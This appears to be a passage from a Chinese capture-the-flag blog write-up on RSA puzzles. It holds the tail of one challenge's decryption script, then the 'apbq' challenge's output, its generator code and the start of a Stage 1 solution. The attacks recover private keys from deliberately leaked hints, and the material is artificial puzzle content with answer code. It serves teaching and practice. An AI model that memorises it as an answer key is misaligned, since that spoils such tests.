使用 int() 将 C_approx 转换为整数</span></span><br><span class="line">        D = (iroot(C_approx, <span class="number">2</span>)[<span class="number">0</span>] + <span class="number">1</span>) * i</span><br><span class="line">        final = powmod(b, u, N)</span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5100</span>,<span class="built_in">int</span>(D)):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Checking r*D for i=<span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;r * D&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4000</span>,<span class="built_in">int</span>(D)):</span><br><span class="line">                <span class="keyword">if</span> powmod(b, r * D + s, N) == final:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Solution found: r =&quot;</span>, r, <span class="string">&quot;s =&quot;</span>, s, <span class="string">&quot;i =&quot;</span>, i)</span><br><span class="line">                    <span class="keyword">return</span> r * D + s</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get the value of c</span></span><br><span class="line">c = Solve_c()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c:&quot;</span>, c)  <span class="comment"># Expected output: c = 51589121</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate A and B for quadratic equation</span></span><br><span class="line">A = u - c  <span class="comment"># x * y = u - c</span></span><br><span class="line">B = v + c * g  <span class="comment"># x + y = v + c * g</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate the values of x and y using the quadratic formula</span></span><br><span class="line">delta = iroot(B * B - <span class="number">4</span> * A, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">x = (B + delta) // <span class="number">2</span></span><br><span class="line">y = (B - delta) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">a = x // <span class="number">2</span></span><br><span class="line">b = y // <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate p and q</span></span><br><span class="line">p = <span class="number">2</span> * g * a + <span class="number">1</span></span><br><span class="line">q = <span class="number">2</span> * g * b + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate private key exponent d</span></span><br><span class="line">d = invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt the ciphertext</span></span><br><span class="line">m = powmod(C, d, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted message:&quot;</span>, long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<h2 id="apbq"><a href="#apbq" class="headerlink" title="apbq"></a>apbq</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[+] Welcome to my apbq game</span><br><span class="line">┃ stage 1: p + q</span><br><span class="line">┃ hints = 18978581186415161964839647137704633944599150543420658500585655372831779670338724440572792208984183863860898382564328183868786589851370156024615630835636170</span><br><span class="line">┃ public key = (89839084450618055007900277736741312641844770591346432583302975236097465068572445589385798822593889266430563039645335037061240101688433078717811590377686465973797658355984717210228739793741484666628342039127345855467748247485016133560729063901396973783754780048949709195334690395217112330585431653872523325589, 65537)</span><br><span class="line">┃ enc1 = 23664702267463524872340419776983638860234156620934868573173546937679196743146691156369928738109129704387312263842088573122121751421709842579634121187349747424486233111885687289480494785285701709040663052248336541918235910988178207506008430080621354232140617853327942136965075461701008744432418773880574136247</span><br><span class="line">----------------------</span><br><span class="line">┃ stage 2: ai*p + bi*q</span><br><span class="line">┃ hints = [18167664006612887319059224902765270796893002676833140278828762753019422055112981842474960489363321381703961075777458001649580900014422118323835566872616431879801196022002065870575408411392402196289546586784096, 16949724497872153018185454805056817009306460834363366674503445555601166063612534131218872220623085757598803471712484993846679917940676468400619280027766392891909311628455506176580754986432394780968152799110962, 17047826385266266053284093678595321710571075374778544212380847321745757838236659172906205102740667602435787521984776486971187349204170431714654733175622835939702945991530565925393793706654282009524471957119991, 25276634064427324410040718861523090738559926416024529567298785602258493027431468948039474136925591721164931318119534505838854361600391921633689344957912535216611716210525197658061038020595741600369400188538567, 22620929075309280405649238349357640303875210864208854217420509497788451366132889431240039164552611575528102978024292550959541449720371571757925105918051653777519219003404406299551822163574899163183356787743543, 20448555271367430173134759139565874060609709363893002188062221232670423900235907879442989619050874172750997684986786991784813276571714171675161047891339083833557999542955021257408958367084435326315450518847393, 16581432595661532600201978812720360650490725084571756108685801024225869509874266586101665454995626158761371202939602347462284734479523136008114543823450831433459621095011515966186441038409512845483898182330730, 23279853842002415904374433039119754653403309015190065311714877060259027498282160545851169991611095505190810819508498176947439317796919177899445232931519714386295909988604042659419915482267542524373950892662544, 16542280976863346138933938786694562410542429842169310231909671810291444369775133082891329676227328401108505520149711555594236523078258701726652736438397249153484528439336008442771240980575141952222517324476607, 17054798687400834881313828738161453727952686763495185341649729764826734928113560289710721893874591843482763545781022050238655346441049269145400183941816006501187555169759754496609909352066732267489240733143973, 22115728663051324710538517987151446287208882441569930705944807337542411196476967586630373946539021184108542887796299661200933395031919501574357288914028686562763621166172668808524981253976089963176915686295217, 19324745002425971121820837859939938858204545496254632010818159347041222757835937867307372949986924646040179923481350854019113237172710522847771842257888083088958980783122775860443475680302294211764812636993025, 17269103712436870749511150569030640471982622900104490728908671745662264368118790999669887094371008536628103283985205839448583011077421205589315164079023370873380480423797655480624151812894997816254147210406492, 17365467616785968410717969747207581822018195905573214322728668902230086291926193228235744513285718494565736538060677324971757810325341657627830082292794517994668597521842723473167615388674219621483061095351780, 20823988964903136690545608569993429386847299285019716840662662829134516039366335014168034963190410379384987535117127797097185441870894097973310130525700344822429616024795354496158261293140438037100429185280939, 19068742071797863698141529586788871165176403351706021832743114499444358327620104563127248492878047796963678668578417711317317649158855864613197342671267006688211460724339403654215571839421451060657330746917459, 20089639597210347757891251257684515181178224404350699015820324544431016085980542703447257134320668961280907495580251880177990935443438799776252979843969984270461013888122703933975001704404129130156833542263882, 22344734326131457204500487243249860924828673944521980798994250859372628295695660076289343998351448667548250129358262592043131205967592613289260998148991388190917863322690137458448696392344738292233285437662495, 22688858027824961235755458925538246922604928658660170686458395195714455094516952026243659139809095639584746977271909644938258445835519951859659822660413616465736923822988993362023001205350387354001389518742538, 21286046487289796335501643195437352334100195831127922478044197411293510360710188581314023052580692810484251118253550837525637065385439859631494533102244585493243972819369812352385425700028640641292410326514111, 21542729548465815605357067072323013570796657575603676418485975214641398139843537820643982914302122976789859817102498484496409546012119998359943274203338400776158986205776474024356567247508744784200354385060666, 22319592382753357951626314613193901130171847776829835028715915533809475362288873045184870972146269975570664009921662023590318988850871708674240304838922536028975978222603171333743353770676344328056539379240160, 25195209191944761648246874631038407055240893204894145709996399690807569652160721616011712739214434932639646688187304865397816188999592774874989401871300784534538762135830014255425391132306536883804201055992313, 18257804244956449160916107602212089869395886846990320452133193087611626919926796845263727422042179229606817439442521540784268169177331707314788427670112999551683927934427716554137597798283300120796277229509678, 20293403064916574136692432190836928681820834973375054705153628740577159076332283715581047503287766236543327123639746352358718218140738999496451259789097826888955418315455420948960832865750253988992454128969953, 15967654820584966012628708475666706277218484919923639492431538068059543232562431059752700377242326527417238151501168940191488179144049286512652111172149113549072003881460743035279388672984805823560897688895124, 25144187979876039024245879200325843092774389926620026124061775431569974232758799200333888039013494603721065709195353330350750055309315207499741437181094874894647736904055829877859906318073991986020178158776286, 15736932921640444103019961538951409924080453868073105830403926861058056351553271238438325117113945341892868641345117717666354739204401152657265824568724844930574396801692131746182948347887298330990039956813130, 18831072673439732764722762485733622234889447953507582396819704359771208236721692820362137219509611319088756045211407777880521726782697895768017460064889670066178710804124631128581556314122255564861269062385337, 23800437561684813552661749774840752013501533683948618798811470214669024646396165487093720960221009038817909066075238937189371227098032581450466402462014437421254375846263830927945343485988463525070074913720710, 24402191070622494792723290726249952159888270689258801831518209605331984684494095167423722682814769395395011136124403802097229547003802312444913008194461779426175966774202219703164060353710247619639616444797670, 20215481513831963554421686543560596857659844027486522940060791775984622049024173363533378455076109165728144576719015392033536498353094895564917644840994662704362121549525329105205514332808950206092190939931448, 18384453917605955747212560280232547481041600196031285084598132475801990710125754705645482436436531608696373462641765399622296314590071558616193035939108523357020287896879479452040171765916716377102454266933226, 21890401344164908103930010123434944359446535642544335610455613014563290097498740447164765588532234051104173227090428486681237432196639010849051113283297943367655458678533223039415083212229970648958070799280218, 18379893441293694747570620009241814202936873442370354246029979042247705730610190888710981918183390028386451290137755339890329474403224043675724851314770861939082447728194632548864823398818221526652331319263027, 18715827130228986951360013590464775001019026913384718876134449689773600060962392738619405370033085704046027397895627933844824630723286144367800484157574548819065406118338665931032779491897783504790669824301288, 13588739911708699123450670852772302012518315143187739886523841133752009403411431627334135210166268158490674049617489193734568451811305631563767138879895461211915128972052001136464325219117009268526575020143259, 18506039912943821193373920483847347155611306173368341979655092778147169768984477236224526786441466933360500418090210912574990962709452725122792963919616633389125605160796446674502416801964271004625701238202575, 22167985517547342184812919437069844889650448522260359154086923601900060998572245598167213217022051141570075284051615276464952346620430587694188548679895095556459804921016744713098882496174497693878187665372865, 21507363933875318987283059841465034113263466805329282129011688531718330888226928182985538861888698160675575993935166249701145994333840516459683763957425287811252135418288516497258724668090570720893589001392220, 20250321586608105267884665929443511322540360475552916143405651419034772061789298150974629817817611591100450468070842373341756704300393352252725859102426665187194754280129749402796746118608937061141768301995522, 16104259151024766025645778755951638093681273234415510444173981198301666343334808614748361662637508091511498829253677167171091582942780017355912433497214576425697459483727777273045993446283721290714044600814203, 14560242181138184594433372530956542527312169507277535425067427080573272033961044062335960097446781943943464713852520415535775461964590009720592053626735276833191667395201287169782350381649400286337671320581068, 16239347596615402699390026749150381714807445218767496868569282767673828662340774349530405347667558555781433774705139593469838946201218537641296949822639509296966092138954685186059819628696340121356660166937131, 21344472317634795288252811327141546596291633424850284492351783921599290478005814133560171828086405152298309169077585647189366292823613547973428250604674234857289341613448177246451956695700417432794886277704716, 16053809990112020217624905718566971288375815646771826941011489252522755953750669513046736360397030033178139614200701025268874379439106827823605937814395162011464610496629969260310816473733828751702925621950679, 18917855883623050190154989683327838135081813638430345099892537186954876489710857473326920009412778140451855952622686635694323466827034373114657023892484639238914593012175120540210780102536003758794571846502397, 22690171278715056779052233972642657173540399024770527983659216197108042021644328773010698851143953503599329885607621773816718008861742027388432534850163666629476315340137626681994316866368449548292328156728206, 21087818524872480052313215092436868441694786060866149491087132591272640372512484925209820065536439188250579925233059144898601140234767300574307770064543499923712729705795392684173268461519802573563186764326797, 18439753470094841291394543396785250736332596497190578058698960152415339036714664835925822942784700917586270640813663002161425694392259981974491535370706560550540525510875465091384383255081297963169390777475352, 20105719699015744146039374208926740159952318391171137544887868739518535254000803811729763681262304539724253518465850883904308979964535242371235415049403280585133993732946919550180260852767289669076362115454200, 17251599484976651171587511011045311555402088003441531674726612079301412643514474016351608797610153172169183504289799345382527665445027976807805594288914226822374523878290416047130731166794970645275146679838899, 23027331991437585896233907022469624030630702237261170259290872847355304456043379238362120518409085840638396736666056992747627271193089116095167049248270541979716594671069985183070290375121270398623215587207529, 18158149685496169798299129683009221264185608469410295069411669832919646968324946121757411511373498747604679198739125835462814352243797919744572086307939585501566092705355693015625009717017077302201663788208609, 18276153196656501517216055049560959047263892309902154534799806637704337317207294332426798932144785240877892837491213916540255237702169595754963908689566362060228840286531616263506272071630209104758589482803348, 19830654702835464289082520892939657653574451119898587213320188332842291005863699764597454403874285715252681820027919359194554863299385911740908952649966617784376852963552276558475217168696695867402522508290055, 15349828226638644963106414986240676364822261975534684137183044733508521003843559094515387144949811552173241406076270015291925943459603622043168219534080772937297911323165839870364550841685270125556125756627553, 20923687596111161976478930953796496927811701530608223491138786355445002217973253897724452954815797952200740069102515860924306246841340715110620719064010080520601890251137419840158983682372232110885549732743013, 21095748006022412831703352650023882351218414866517568822818298949510471554885207645049385966827210564667371665855668707424105040599599901165292360321667007968065708796593851653085339928947755081203265281357013, 20136320433636422315432754195821125224777716034031656342233368000257459497472596860252592531939146543685406198978058242599116859263546329669263543660114747385041549283367183026001454445297981439938401547228229, 16496919752274418275948572022974868132658743151124597724312835413857298109100258912203517423633396955060591787380445877361136405137884456764770035346437177846666365911942996404514058688909577420388537479730705, 13788728438272498164727737074811797093818033799836159894472736480763530670013682288670889124484670336660448907074673625466218166413315342420667608074179975422284472184048790475129281850298519112884101776426380, 24852871485448795332267345793743281093931161235481251209948049584749441451621572752080662697610253315331335180611651946374137068256112152253681972406000252076016099200912670370417045090034045383991812756120791, 18663346319122078996775762643035864683521213720864038756854558668694021987970601131985163948257100423991091156649638455828855082098689641225427227191064496066436196910238564311309556938903101074363279783438714, 21400068681031931459396470039651524575262457489792894764406364952394476440804779651233022862527636114968325782197380721095406628084183336358459476006267416033892771932528688312375109463803215034905281657962293, 16044158155847172030103761204572942507195578382208455423846603003318483484698088948486132040995746837257705704187725306831142305215342467016564452582165866039427184607605673304595194959499145031211096109534167, 16518253246325822837502418827700493807621067058438396395472266350036385535241769917459657069911028720968654253735107131282350340465691670072304718987805883113410923109703284511709226857412404454224134480632696, 22032469066601123287586507039704080058983969235246539501189720236880312024198451198788699002335010120658564926677243708367430773661097221076615953342733896063909953602379936312639192315223258556134958059637605, 17474611942177808070315948910226643697957069578572244709354155010512694059987765040746148981545760660371360975936526076852619987733316042847813177383519241505024635332293992920023420060610648140841369822739716, 20097265939024591617239874622716452182434300498447992668997438018575636772416262543204370899462096267444545094719202447520254303983442269757551626971917981420832391886214473318353984504467919530676605744560570, 18170251482705061226968041449812078923477452841162650888922564215790088545936753453513162197661916172215859504545409274440450807677845894292177296835154674774694992388033874349807244020099167681146357128785394, 18084007437523118129421476751918491055914528331902780911288404344016551650138679157754567938593688369062981279371320169939281882307797009116458871503759873023914718337944953764426183937635379280572434676575757, 17001811604221128900675671565539617923973183364469396458234914432162200119518252971721448274846235879320362924206656971472493711107677598961463553324277826426691784458674010708635756004550789902368338633272118, 20217009574515126619724139485885721324936960849401637840860565569588595992087537454744066905387396266844236387315004915383456736142307523960394594650088663019228826091309049211780607761862663242437656610298243, 25534440916970201550118006203706860249111087748000550226680885431006136131742280963090650607632467666558508520152535105122661615376298673454198064361094319699307084117001019115669670029195171047304283891069792, 18871869316294018605789169171879572816494092699556970507058691345095743053290043643010965660058888064972257990750611470141816041727746767146945121588515830427165739580791663951175220638901672353681640741068573, 20173968537913641339915058056878181363456579537994317562789857397928196160113042659777558550242315788417022891612723148843142958668959046890197219991727894451795438138592005695329607326086644956073759609743066, 20601943394990265144021144365970164017319737300436518536503270346147112565303361487668388700369636611354280332841812324530501569200031186584749278453651172121161814207025650519637781007286435981682228528706305, 16397528630087028144645213166977866073543422560337716097539091258081008408890966764995645782823950721804205427713461441138000880478364026137452291234097219085473748076681729365744710225699866258812642458184750, 21373350333568141000876969785296802670776508778278005158047105058430550665787088265486222905402690421155861103648370249249790560185790723042867282734693553039477436055775198037042047438047898227097749354619822, 17767469767416052322357795736899648760868316512079849340028040817353808899589201201338152114229279980849491049574543361275046276135253417685681262008211582060955974064559129311524323185960856955462761555353091, 22148352529815091269441663541923247974004854058764556809596705832663604786920964849725772666340437231503146814919702525852955831173047034475925578238466977606367380212886384487294569287202762127531620290162734, 21663842528026621741414050256553652815372885707031383713657826718944735177083300302064509342116651731671570591336596953911570477161536730982887182434407761036442993588590230296643001682944654490645815177777455, 20219077358929317461660881724990436334639078047412693497584358963241840513748365548465302817975329987854784305275832045889690022909383530837382543579292451297269623663257098458645056099201050578472103957851128, 18255302182526662903763852563401346841065939531070045000414364747445988455597258924280193695407035356029557886165605853810182770534711966292253269625917149411889979307227493949293798772727125069093642134972336, 24926064145128749429079117171467042019887257504329103038171762786986349157515552927216574990423327013202735544601170247730647598931030432792167867343343213411600516855009788294067588153504026267213013591793027, 22369607314724468760253123915374991621544992437057652340350735935680183705467064876346663859696919167243522648029531700630202188671406298533187087292461774927340821192866797400987231509211718089237481902671100, 16994227117141934754898145294760231694287000959561775153135582047697469327393472840046006353260694322888486978811557952926229613247229990658445756595259401269267528233642142950389040647504583683489067768144570, 21758885458682118428357134100118546351270408335845311063139309657532131159530485845186953650675925931634290182806173575543561250369768935902929861898597396621656214490429009706989779345367262758413050071213624, 20156282616031755826700336845313823798147854495428660743884481573484471099887576514309769978525225369254700468742981099548840277532978306665910844928986235042420698332201264764734685502001234369189521332392642, 23291765247744127414491614915358658114280269483384022733002965612273627987872443453777028006606037159079637857473229879140366385523633075816362547967658930666106914269093225208138749470566410361196451552322613, 19807792217079652175713365065361659318870738952921195173619551645956745050506271953949139230097128034416815169649874760890189515620232505703162831090225715453502422905418824316957257395992121750661389503495033, 22074209373194902539215367382758486068533032275912313703269990627206774967653336496619231924013216321042649461711292555464574124714934511202231319963361912937842068483700298097209400217869036338644607607557860, 19678336511265998427322297909733474384702243426420286924671444552444079816707773485084891630780465895504253899943221044355971296122774264925882685351095921532685536165514189427245840338009573352081361238596378, 24746314790210393213546150322117518542380438001687269872679602687597595933350510598742749840102841364627647151669428936678130556027300886850086220074563664367409218038338623691372433831784916816798993162471163, 19346137206512895254202370018555139713690272833895195472766704715282164091959131850520571672509601848193468792313437642997923790118115476212663296111963644011010744006086847599108492279986468255445160241848708, 22739514514055088545643169404630736699361136323546717268615404574809011342622362833245601099992039789664042350284789853188040159950619203242924511038681127008964592137006103547262538912024671048254652547084347, 21491512279698208400974501713300096639215882495977078132548631606796810881149011161903684894826752520167909538856354238104288201344211604223297924253960199754326239113862002469224042442018978623149685130901455, 19381008151938129775129563507607725859173925946797075261437001349051037306091047611533900186593946739906685481456985573476863123716331923469386565432105662324849798182175616351721533048174745501978394238803081, 19965143096260141101824772370858657624912960190922708879345774507598595008331705725441057080530773097285721556537121282837594544143441953208783728710383586054502176671726097169651121269564738513585870857829805]</span><br><span class="line">┃ public key = (73566307488763122580179867626252642940955298748752818919017828624963832700766915409125057515624347299603944790342215380220728964393071261454143348878369192979087090394858108255421841966688982884778999786076287493231499536762158941790933738200959195185310223268630105090119593363464568858268074382723204344819, 65537)</span><br><span class="line">┃ enc2 = 30332590230153809507216298771130058954523332140754441956121305005101434036857592445870499808003492282406658682811671092885592290410570348283122359319554197485624784590315564056341976355615543224373344781813890901916269854242660708815123152440620383035798542275833361820196294814385622613621016771854846491244</span><br><span class="line">----------------------</span><br><span class="line">┃ stage 3: a*p + q, p + bq</span><br><span class="line">┃ hints = (68510878638370415044742935889020774276546916983689799210290582093686515377232591362560941306242501220803210859757512468762736941602749345887425082831572206675493389611203432014126644550502117937044804472954180498370676609819898980996282130652627551615825721459553747074503843556784456297882411861526590080037, 117882651978564762717266768251008799169262849451887398128580060795377656792158234083843539818050019451797822782621312362313232759168181582387488893534974006037142066091872636582259199644094998729866484138566711846974126209431468102938252566414322631620261045488855395390985797791782549179665864885691057222752)</span><br><span class="line">┃ public key = (94789409892878223843496496113047481402435455468813255092840207010463661854593919772268992045955100688692872116996741724352837555794276141314552518390800907711192442516993891316013640874154318671978150702691578926912235318405120588096104222702992868492960182477857526176600665556671704106974346372234964363581, 65537)</span><br><span class="line">┃ enc3 = 17737974772490835017139672507261082238806983528533357501033270577311227414618940490226102450232473366793815933753927943027643033829459416623683596533955075569578787574561297243060958714055785089716571943663350360324047532058597960949979894090400134473940587235634842078030727691627400903239810993936770281755</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> ceil</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSA</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, privatekey, publickey</span>):</span><br><span class="line">        <span class="variable language_">self</span>.p, <span class="variable language_">self</span>.q, <span class="variable language_">self</span>.d = privatekey</span><br><span class="line">        <span class="variable language_">self</span>.n, <span class="variable language_">self</span>.e = publickey</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, plaintext</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(plaintext, <span class="built_in">bytes</span>):</span><br><span class="line">            plaintext = bytes_to_long(plaintext)</span><br><span class="line">        ciphertext = <span class="built_in">pow</span>(plaintext, <span class="variable language_">self</span>.e, <span class="variable language_">self</span>.n)</span><br><span class="line">        <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, ciphertext</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(ciphertext, <span class="built_in">bytes</span>):</span><br><span class="line">            ciphertext = bytes_to_long(ciphertext)</span><br><span class="line">        plaintext = <span class="built_in">pow</span>(ciphertext, <span class="variable language_">self</span>.d, <span class="variable language_">self</span>.n)</span><br><span class="line">        <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_keypair</span>(<span class="params">nbits, e = <span class="number">65537</span></span>):</span><br><span class="line">    p = getPrime(nbits//<span class="number">2</span>)</span><br><span class="line">    q = getPrime(nbits//<span class="number">2</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    d = inverse(e, n - p - q + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> (p, q, d), (n, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pt = <span class="string">&#x27;./output.txt&#x27;</span></span><br><span class="line">    fout = <span class="built_in">open</span>(pt, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    sys.stdout = fout</span><br><span class="line"></span><br><span class="line">    block_size = ceil(<span class="built_in">len</span>(flag)/<span class="number">3</span>)</span><br><span class="line">    flag = [flag[i:i+block_size] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), block_size)]</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] Welcome to my apbq game&#x27;</span>)</span><br><span class="line">    <span class="comment"># stage 1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;┃ stage 1: p + q&#x27;</span>)</span><br><span class="line">    prikey1, pubkey1 = get_keypair(<span class="number">1024</span>)</span><br><span class="line">    RSA1 = RSA(prikey1, pubkey1)</span><br><span class="line">    enc1 = RSA1.encrypt(flag[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;┃ hints = <span class="subst">&#123;prikey1[<span class="number">0</span>] + prikey1[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;┃ public key = <span class="subst">&#123;pubkey1&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;┃ enc1 = <span class="subst">&#123;enc1&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;----------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># stage 2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;┃ stage 2: ai*p + bi*q&#x27;</span>)</span><br><span class="line">    prikey2, pubkey2 = get_keypair(<span class="number">1024</span>)</span><br><span class="line">    RSA2 = RSA(prikey2, pubkey2)</span><br><span class="line">    enc2 = RSA2.encrypt(flag[<span class="number">1</span>])</span><br><span class="line">    kbits = <span class="number">180</span></span><br><span class="line">    a = [getRandomNBitInteger(kbits) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line">    b = [getRandomNBitInteger(kbits) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line">    c = [a[i]*prikey2[<span class="number">0</span>] + b[i]*prikey2[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;┃ hints = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;┃ public key = <span class="subst">&#123;pubkey2&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;┃ enc2 = <span class="subst">&#123;enc2&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;----------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># stage 3</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;┃ stage 3: a*p + q, p + bq&#x27;</span>)</span><br><span class="line">    prikey3, pubkey3 = get_keypair(<span class="number">1024</span>)</span><br><span class="line">    RSA3 = RSA(prikey3, pubkey3)</span><br><span class="line">    enc3 = RSA2.encrypt(flag[<span class="number">2</span>])</span><br><span class="line">    kbits = <span class="number">512</span></span><br><span class="line">    a = getRandomNBitInteger(kbits)</span><br><span class="line">    b = getRandomNBitInteger(kbits)</span><br><span class="line">    c1 = a*prikey3[<span class="number">0</span>] + prikey3[<span class="number">1</span>]</span><br><span class="line">    c2 = prikey3[<span class="number">0</span>] + b*prikey3[<span class="number">1</span>] </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;┃ hints = <span class="subst">&#123;c1, c2&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;┃ public key = <span class="subst">&#123;pubkey3&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;┃ enc3 = <span class="subst">&#123;enc3&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="阶段-1-p-qp-q"><a href="#阶段-1-p-qp-q" class="headerlink" title="阶段 1: p+qp+q"></a>阶段 1: p+q<em>p</em>+<em>q</em></h3><p>在第一阶段中，我们获得了以下信息：</p>
<ul>
<li>模数 n&#x3D;p⋅q<em>n</em>&#x3D;<em>p</em>⋅<em>q</em></li>
<li>提示 p+q<em>p</em>+<em>q</em></li>
</ul>
<p>根据已知信息，我们可以构造一个关于 p<em>p</em> 和 q<em>q</em> 的二次方程：</p>
<p>t2−(p+q)t+pq&#x3D;0<em>t</em>2−(<em>p</em>+<em>q</em>)<em>t</em>+<em>pq</em>&#x3D;0</p>
<p>代入 p+q&#x3D;x<em>p</em>+<em>q</em>&#x3D;<em>x</em> 和 pq&#x3D;n<em>pq</em>&#x3D;<em>n</em>，方程变为：</p>
<p>t2−xt+n&#x3D;0<em>t</em>2−<em>x**t</em>+<em>n</em>&#x3D;0</p>
<p>通过求解这个二次方程的根，我们可以使用求根公式：</p>
<p>t&#x3D;x±x2−4n2<em>t</em>&#x3D;2<em>x</em>±<em>x</em>2−4<em>n</em></p>
<p>得到两个根 p<em>p</em> 和 q<em>q</em>。一旦确定 p<em>p</em> 和 q<em>q</em>，接着可以计算 ϕ(n)<em>ϕ</em>(<em>n</em>):</p>
<p>ϕ(n)&#x3D;(p−1)(q−1)<em>ϕ</em>(<em>n</em>)&#x3D;(<em>p</em>−1)(<em>q</em>−1)</p>
<p>然后计算私钥 d<em>d</em>:</p>
